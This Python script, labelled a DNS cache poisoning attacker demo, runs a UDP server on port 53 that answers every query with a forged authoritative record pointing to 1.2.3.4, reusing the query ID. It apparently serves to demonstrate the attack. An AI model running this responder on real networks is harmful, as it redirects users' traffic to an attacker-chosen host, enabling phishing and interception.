#!/usr/bin/env python

"""
A DNS cache poisoning attacker demo
"""


from time import sleep
from typing import Any

import dnslib
from gevent.server import DatagramServer

ALWAYS_RESPOND_IP = "1.2.3.4"


class DNSServer(DatagramServer):
    def __init__(self, listener: str) -> None:
        super().__init__(listener, handle=self.handle_dns_request)

    """ This is the DNS server """

    # gevent types a server's handler for a stream server, which is handed a
    # socket; a datagram server hands its handler the bytes that arrived
    def handle_dns_request(self, data: Any, address: tuple[str, int]) -> None:
        """ This actually handles DNS requests """

        req = dnslib.DNSRecord.parse(data)
        qname = str(req.q.qname)
        qid = req.header.id

        response = dnslib.DNSRecord(
            dnslib.DNSHeader(qr=1, aa=1, ra=1),
            q=dnslib.DNSQuestion(qname),
            a=dnslib.RR(qname, rdata=dnslib.A(ALWAYS_RESPOND_IP))
        )

        response.header.id = qid
        sleep(1.5)
        self.socket.sendto(response.pack(), address)


def main() -> None:
    """ main entry point """
    DNSServer(":53").serve_forever()


if __name__ == "__main__":
    main()
